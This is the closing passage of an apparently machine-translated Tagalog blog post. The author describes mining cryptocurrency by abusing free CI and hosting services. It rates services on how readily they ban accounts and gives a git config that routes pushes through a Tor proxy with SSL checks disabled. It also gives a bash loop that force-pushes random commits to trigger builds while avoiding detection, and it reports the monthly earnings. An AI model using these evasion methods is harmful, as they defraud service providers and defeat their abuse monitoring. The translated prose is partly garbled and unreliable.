style=text-align:center>Circleci<td style=color:red;text-align:center>masama<td style=color:green;text-align:center>mabuti<td style=color:#ff0;text-align:center>daluyan<tr><td style=text-align:center>Semaphore<td style=color:green;text-align:center>mabuti<td style=color:green;text-align:center>mabuti<td style=color:#ff0;text-align:center>daluyan<tr><td style=text-align:center>Pantalan<td style=color:#ff0;text-align:center>daluyan<td style=color:#ff0;text-align:center>daluyan<td style=color:green;text-align:center>mabuti<tr><td style=text-align:center>Quay<td style=color:green;text-align:center>mabuti<td style=color:#ff0;text-align:center>daluyan<td style=color:#ff0;text-align:center>daluyan<tr><td style=text-align:center>Codefresh<td style=color:red;text-align:center>masama<td style=color:green;text-align:center>mabuti<td style=color:#ff0;text-align:center>daluyan<tr><td style=text-align:center>Wercker<td style=color:#ff0;text-align:center>daluyan<td style=color:#ff0;text-align:center>daluyan<td style=color:red;text-align:center>masama<tr><td style=text-align:center>Azure-pipelines<td style=color:#ff0;text-align:center>daluyan<td style=color:#ff0;text-align:center>daluyan<td style=color:red;text-align:center>masama<tr><td style=text-align:center>Patuloy naphp<td style=color:red;text-align:center>masama<td style=color:#ff0;text-align:center>daluyan<td style=color:#ff0;text-align:center>daluyan<tr><td style=text-align:center>Buddy<td style=color:red;text-align:center>masama<td style=color:red;text-align:center>masama<td style=color:red;text-align:center>masama<tr><td style=text-align:center>Drone<td style=color:red;text-align:center>masama<td style=color:green;text-align:center>mabuti<td style=color:red;text-align:center>masama<tr><td style=text-align:center>Tagataguyod<td style=color:red;text-align:center>masama<td style=color:#ff0;text-align:center>daluyan<td style=color:red;text-align:center>masama<tr><td style=text-align:center>Nevercode<td style=color:red;text-align:center>masama<td style=color:green;text-align:center>mabuti<td style=color:#ff0;text-align:center>daluyan<tr><td style=text-align:center>Zeist / vercel<td style=color:red;text-align:center>masama<td style=color:green;text-align:center>mabuti<td style=color:red;text-align:center>masama</table><p>Sa kontekstong ito, a<span style=color:green> mabuti</span> nangangahulugan ang pagsasaayos na hindi ito tumagal ng maraming oras upang mai-configure ang a<code>ci</code> trabaho para sa proseso ng pagmimina (tulad ng lahat ng mga serbisyo na umaasa sa isang web dashboard sa halip na isang repository dot-file ay isang gawain), isang<span style=color:red> masama</span><code>ban-hammer</code> nangangahulugan na mahirap magparehistro sa serbisyo, o ang mga account ay magiging mas agresibo na ipagbawal.<p><a href=https://web.archive.org/web/20210222050951/https://www.bitrise.io/> Bitrise</a> Kinakailangan na mag-set up ng isang proyekto, upang mapaghihinuha ang kapaligiran, ang target na arkitektura, ang proseso ng pagpapatupad at iba pang mga bagay, napakahihintay upang mag-setup ng isang build kaya nakakuha ito ng isang hindi magandang rating sa pagsasaayos.<a href=https://web.archive.org/web/20210310010750/https://continuousphp.com/> Patuloy naphp</a>, <a href=https://web.archive.org/web/20210322133805/https://buddy.works/> Buddy</a> , Ang [Codefresh] ay mayroon ding maraming mga manu-manong hindi deklaradong mga hakbang sa pagsasaayos.<p>Mga serbisyo tulad ng [Azure-pipelines],<a href=https://web.archive.org/web/20210308202144/https://app.wercker.com/> Wercker</a>, <a href=https://web.archive.org/web/20210322133805/https://buddy.works/> Buddy</a> naglalapat ng mga shadow-ban sa mga account, ang mga shadow-ban ay masama, dahil iniiwan ka nila na hulaan kung may mali sa iyong pagsasaayos o hindi. Sa ilang mga serbisyo maaari mong hulaan ang dahilan ng pagbabawal (halos ang iyong pagbuo ay tumagal ng masyadong maraming oras, o nagtayo ka ng masyadong maraming beses sa isang maikling panahon), para sa ilang iba pa tulad ng [Azure-pipelines] Ipinapalagay kong naglapat sila ng ilang uri ng fingerprint sa mga repository ng gumagamit habang ang mga pagbabawal ay dumarating kahit na walang anumang pag-abuso sa mga mapagkukunan, pinaghigpitan din ang azure at vercel<code>DNS</code> pag-access sa loob ng mga pampublikong build machine, kaya't iyon ay karagdagang alitan na kailangang mapagtagumpayan ng ad-hoc tunnel.<p><a href=https://web.archive.org/web/20210327045555/https://cloud.drone.io/welcome> Drone</a> nagbigay ng pag-access sa isang buong 16+ core processor ngunit natapos ang pagbabawal pagkatapos ng 2 build<sup id=fnref:saddrone><a class=fnref href=#fndef:saddrone>[13]</a></sup>. <a href=https://web.archive.org/web/20210322100629/https://www.cloudbees.com/products/codeship> Codeship</a> nagbibigay din ng pag-access sa malakas na mga host ng build at hindi nagbawal bilang agresibo tulad ng drone.<p>Ang aking mga paboritong serbisyo hindi dahil sa kakayahang kumita ngunit para sa kadalian at kaginhawaan (kasama rin ang iba pang mga proyekto)<a href=https://web.archive.org/web/20210324163536/https://travis-ci.org/> Travis</a>, <a href=https://web.archive.org/web/20210308041527/https://semaphoreci.com/> Semaphore</a> at<a href=https://web.archive.org/web/20210322105637/https://hub.docker.com/> Docker-hub</a> . Ang Travis ay tulad ng karaniwang CI at napaka-kakayahang umangkop, ang Semaphore lamang<code>DSL</code> para sa<code>CI</code> na mukhang malalapitan at maayos kahit na sa halip na isang walang katapusang pagkakasunud-sunod ng mga spaghettified check-box tulad ng iba pang mga UI, at Docker para lamang sa pagiging simple upang mapa ang mga dockerfile upang maitayo.<h3 id=builds_configs><a class=header-anchor href=#builds_configs> Bumubuo ng mga config</a></h3><p>Ang mga build ay na-trigger alinman sa mga trabaho sa cron na inaalok ng mga serbisyo sa web o ng mga commit na git. Kaya't kailangan mong subaybayan ang isang basura ng mga token sa pag-access o ssh key upang pamahalaan ang lahat ng mga git commits. Mahalaga rin na huwag labis na gumawa ng spam, at gumamit ng mga proxy kapag itinutulak sa mga repositoryang nag-configure ng git:<pre><code class="toml hljs"><span class=hljs-section>[http]</span><span class=hljs-attr>proxy</span> = socks5://<span class=hljs-number>127.0</span>.<span class=hljs-number>0.1</span>:<span class=hljs-number>9050</span><span class=hljs-attr>sslverify</span> = <span class=hljs-literal>false</span><span class=hljs-section>[https]</span><span class=hljs-attr>proxy</span> = socks5://<span class=hljs-number>127.0</span>.<span class=hljs-number>0.1</span>:<span class=hljs-number>9050</span><span class=hljs-attr>sslverify</span> = <span class=hljs-literal>false</span><span class=hljs-section>[url "https://"]</span><span class=hljs-attr>insteadOf</span> = git://</code></pre><p>Gamit ang mga serbisyo sa pagho-host ng git, ang github ay ang isa pang masusing tungkol sa mga pagbabawal, ngunit ipinatupad lamang ito sa mga ulat ng pang-aabuso ng mga admin ng mga serbisyo ng ci, isang beses na pinatupad ng gitlab ang isang alon ng pagbabawal, nang sinubukan kong i-renew ang pagsubok sa CI (walang ingat). Hindi pa ako nakakatanggap ng pagbabawal para sa isang bitbucket account. Upang (pilitin) itulak ang git commits, mayroon kaming isang mahabang tumatakbo loop na muling nai-tag ang git repository:<pre><code class="bash hljs"><span class=hljs-keyword>while</span> :; <span class=hljs-keyword>do</span>
    repos_count=$(<span class=hljs-built_in>ls</span> -ld <span class=hljs-variable>${repos}</span>/* | grep -c ^d)
    repos_ival=$(((RANDOM%variance+delay)/repos_count))
    <span class=hljs-keyword>for</span> r <span class=hljs-keyword>in</span><span class=hljs-variable>$repos</span>/*; <span class=hljs-keyword>do</span><span class=hljs-built_in>cd</span><span class=hljs-string>"<span class=hljs-variable>$r</span>"</span>
        git fetch --all
        tagger
        <span class=hljs-built_in>echo</span> -e <span class=hljs-string>"\e[32m"</span><span class=hljs-string>"sleeping for <span class=hljs-variable>$repos_ival</span> since <span class=hljs-subst>$(date +%H:%M:%S\ %b/%d)</span>"</span><span class=hljs-string>"\e[0m"</span><span class=hljs-built_in>sleep</span><span class=hljs-variable>$repos_ival</span><span class=hljs-keyword>done</span><span class=hljs-built_in>sleep</span> 1
<span class=hljs-keyword>done</span></code></pre><p>Maaaring posible na ang puwersang itulak sa ganitong paraan ay hindi isang bagay na ginusto ng github at maaaring maging sanhi ng pag-flag ng mga account. Ang pag-andar ng tagger na may tungkuling lakas na itulak ang iba't ibang mga commits, gumagamit ng isang website (na maaari mong madaling tingnan) na nagbibigay ng ilang mga random na commits. Hindi ako sigurado kung gaano ito nakakatulong, dahil ang nilalaman mismo ng mga pangako ay malinaw na kahina-hinala para sa aking kaso. At kinagat din ako nito sa asno nang isang beses, dahil ang mga pangako na naibalik ng utos na ito ay maaaring magsama ng mga salitang sumpa, ang isa sa aking mga ginawa ay kinuha ng isang bot ng twitter na sumusubaybay sa git na gumagawa ng mga sumpung salita! Nagdagdag ako ng isang blacklist para sa masasamang salita pagkatapos ng insidente.<p>Hindi ko talaga napagmasdan ang mga hindi gumagaling na git commits at obfuscated git repositories. Ang tanging pagkakataon kung saan gumagamit ako ng isang mas detalyadong lalagyan ay kasama ng Bitrise dahil hindi mo mai-set up ang isang build kung hindi kinikilala ng system ang isang kapaligiran (tulad ng mga mobile app), ngunit kahit na doon ay walang anumang pag-ikot at laging pareho ito imbakan, medyo madali upang makita.<p>Sa pangkalahatan, kung kailangan kong magbalangkas ng isang kurba sa kampanilya sa paligid ng pinakamainam na oras sa minahan<em> wala</em>ang pagbabawal ng mga account, sa lahat ng mga nasubok na serbisyo, ay magkakaroon ng isang sentro na humigit-kumulang na 1 oras na tagal ng pagbuo, isang beses bawat araw. Para sa mga cpu cores, hiwalay para sa isang hindi sinungaling (tulad ng drone), inaasahan ng karamihan sa mga serbisyo na gagamitin mo ang buong halaga ng mga mapagkukunan na ibinigay sa iyo dahil ang mga build ay pinapatakbo sa loob ng mga VM o lalagyan na may pinipigilan na mapagkukunan ... at ang pagtitipon ay karaniwang isang gawain na saturates cpu, kaya't wala itong kaugnayan sa istatistika. Matalinong isang pagbuo bawat araw ay kung ano ang gagawin ng average na developer, kaya dapat mong asahan ang mga itinaas na watawat kung nalalayo ka mula sa ibig sabihin, at ang pagtulak para sa pang-aabuso ay hindi magtatapos nang maayos.<h2 id=conclusions><a class=header-anchor href=#conclusions> Konklusyon</a></h2><p>Sulit ba ito? Ang mga bahagi ng networking ay tiyak na kagiliw-giliw, pakikitungo sa mga pagrehistro sa account ay malinaw na ang pinakamasamang bahagi, gusto ng mga nobodies na mag-click sa walang katapusang mga email ng kumpirmasyon at paulit-ulit na pag-iisip na namamanhid sa mga pamamaraan ng UI, pagkatapos ng lahat. Ang pagsulat ng software ng automation ng spam ay nakakainip din (dahil ang karamihan sa iyong pag-pok sa mga API na pipi), at sa palagay na ito (at ang katotohanang hindi ito naging anumang seryoso) Ni hindi ko ito naisaalang-alang. Kumita ba ito? Sa rurok nito umabot ito ng isang bagay tulad ng<code>300$</code> bawat buwan, marahil sapat para sa isang venezuelan, hindi talaga para sa akin :)<p><table class=fndef id=fndef:adversary><tbody><tr><td class=fndef-backref><a href=#fnref:adversary>[1]</a><td class=fndef-content><em> ang masungit na sysadmin</em></table><table class=fndef id=fndef:infoproc><tbody><tr><td class=fndef-backref><a href=#fnref:infoproc>[2]</a><td class=fndef-content>kahit na masisira nito ang maraming mga pagpapalagay sa privacy, sigurado ako na ang karamihan sa kanila ay sumisilip lamang sa loob tuwing mayroong isang kasalukuyang nanunungkulan na problema, ngunit ito ay isang problema lamang para sa mga runtime na batay sa lalagyan, samantalang ang mga VM ay medyo mga itim na kahon.</table><table class=fndef id=fndef:monerominer><tbody><tr><td class=fndef-backref><a href=#fnref:monerominer>[3]</a><td class=fndef-content>ang minero na itinayo sa monero node ay nakakuha ng ilang gawain upang gawing mas friendly ang background, ngunit ang pamamahagi ng xmrig ay hindi kailanman nakatuon sa kabaitan sa background.</table><table class=fndef id=fndef:difficulty><tbody><tr><td class=fndef-backref><a href=#fnref:difficulty>[5]</a><td class=fndef-content>ang ilang mga pool ay nag-aalok ng iba't ibang mga paghihirap sa iba't ibang mga port ng koneksyon, at may posibilidad na ihanay ang kahirapan sa trabaho sa mga namimigay ng pagbabahagi ng minero, ngunit ang granularity ng proxy ay mas maginhawa pa rin, dahil maiiwasan nito ang pool<a href=https://en.wikipedia.org/wiki/Vendor_lock-in> ikulong</a> (kahit na hindi talaga kami lumipat ng mga pool).</table><table class=fndef id=fndef:configwatch><tbody><tr><td class=fndef-backref><a href=#fnref:configwatch>[4]</a><td class=fndef-content>hindi ito natuwa nang biglang lumitaw ang config at nawala sa file system</table><table class=fndef id=fndef:stratumprotocol><tbody><tr><td class=fndef-backref><a href=#fnref:stratumprotocol>[6]</a><td class=fndef-content>Hindi namin pinag-uusapan ang<a href=https://en.bitcoin.it/wiki/Stratum_mining_protocol> stratum na protokol</a> dahil kakailanganin lamang nating harapin ang anumang ipinatupad sa<em> pareho</em> ang pool at ang minero ... na kung saan ay karaniwang hubad minimum, at posibleng may mga hindi karaniwang extension.</table><table class=fndef id=fndef:fullbash><tbody><tr><td class=fndef-backref><a href=#fnref:fullbash>[7]</a><td class=fndef-content>huwag nang magmula bash :)</table><table class=fndef id=fndef:memoryondemand><tbody><tr><td class=fndef-backref><a href=#fnref:memoryondemand>[8]</a><td class=fndef-content>Hindi ko ginalugad kung ano ang nangyayari kapag ang isang proseso ay naglo-load ng karagdagang pag-andar sa runtime, dahil ang kernel ay hahanapin ang address sa layout ng memorya ng maipapatupad, na mag-access sa filesystem at posibleng maging sanhi ng isang pag-crash.</table><table class=fndef id=fndef:freehostinglimits><tbody><tr><td class=fndef-backref><a href=#fnref:freehostinglimits>[9]</a><td class=fndef-content>Ang mga limitasyon ay di-makatwirang, ang oras ng CPU ay mas mababa sa isang segundo, ang memorya ay mas mababa sa 128M, ang mga papasok na koneksyon ay na-block.</table><table class=fndef id=fndef:cpanelssh><tbody><tr><td class=fndef-backref><a href=#fnref:cpanelssh>[10]</a><td class=fndef-content>na may kaunting pasensya maaari mo ring patakbuhin ang isang buong halimbawa ng ssh sa isang kapaligiran na naka-boots sa paligid ng iyong cpanel account space,<em> wala</em> pagkakaroon ng access sa cpanel builtin SSH na may posibilidad na hindi paganahin ng mga nagbibigay ng hosting.</table><table class=fndef id=fndef:openshift><tbody><tr><td class=fndef-backref><a href=#fnref:openshift>[11]</a><td class=fndef-content>Ang openshift ay nagpunta mula sa isang 1 taong libreng baitang hanggang 3 buwan hanggang 1 buwan, nagsisimula nang nangangailangan ng pagpapatotoo sa telepono, masisiguro kong hindi lamang ako ang nag-aabuso sa kanilang mga serbisyo.</table><table class=fndef id=fndef:herokucontainers><tbody><tr><td class=fndef-backref><a href=#fnref:herokucontainers>[12]</a><td class=fndef-content>Ang mga Heroku free tier container ay lubos na mapagbigay sa mga mapagkukunan, nagbibigay sila ng 4c / 8t (virtual) na cpus, maraming ram at malaking imbakan (na kung saan ay hindi paulit-ulit at itinapon sa pag-shutdown ng dyno).</table><table class=fndef id=fndef:saddrone><tbody><tr><td class=fndef-backref><a href=#fnref:saddrone>[13]</a><td class=fndef-content>Nagdagdag sila ng mas mahigpit na mga patakaran sa pagpaparehistro, pagkatapos ng isang pares ng mga pagbabawal, maaaring nag-ambag ako rito.</table><p><div id=post-tags-list>Mag-post ng Mga Tag: <span class=post-tag><a href=https://www.unto.re/tag/crypto> crypto</a>, </span><span class=post-tag><a href=https://www.unto.re/tag/net> neto</a>, </span><span class=post-tag><a href=https://www.unto.re/tag/shell> kabibi</a></span></div><div class=page-foot><div class=copyright>August 21, 2021</div><script async crossorigin=anonymous issue-term=pathname label=Comment repo=untoreh/untoreh.github.io src=https://utteranc.es/client.js></script></div></div><div class=page__footer><footer><div class=page__footer-copyright>© untoreh - Pinapagana ng<a href=https://github.com/tlienart/Franklin.jl> Franklin</a></div><div class=page__footer-links>- <ul><li><a href=/tl/sitemapxml> Sitemap</a></li> | <li><a href=/tl/tag> Mga tag</a></li> | <li><a href=https://www.unto.re/tag/feed.xml> RSS</a></ul></div><ul class=author__wrap><li class="author__urls social-icons"><a rel="nofollow noopener noreferrer" title="Twitter link"href=https://twitter.com/untoreh><i class="fab fa-fw fa-twitter-square"aria-hidden=true></i></a><li class="author__urls social-icons"><a rel="nofollow noopener noreferrer" title="GitHub link"href=https://github.com/untoreh><i class="fab fa-fw fa-github"aria-hidden=true></i></a><li class="author__urls social-icons"><a href=mailto:contact@unto.re title=email><i class="fas fa-envelope"></i></a><li><script type=application/ld+json>{"potentialAction":{"query-input":"required maxlength=100 name=input","actionStatus":"https://schema.org/PotentialActionStatus","query":"required","@type":"SearchAction","target":{"uri":"","scheme":"https","userinfo":"","host":"www.unto.re","port":"","path":"/search","query":"q=%7Binput%7D","fragment":""}}}</script></ul></footer></div><script crossorigin=anonymous defer id=fa integrity=sha384-DJ25uNYET2XCl5ZF++U8eNxPWqcKohUUBUpKGlNLMchM7q4Wjg2CUpjHLaL8yYPH src=https://use.fontawesome.com/releases/v5.8.2/js/all.js></script><script src=/libs/colors.js></script><script src=/libs/menu.js></script><script defer src=/libs/lunr/lunr.min.js></script>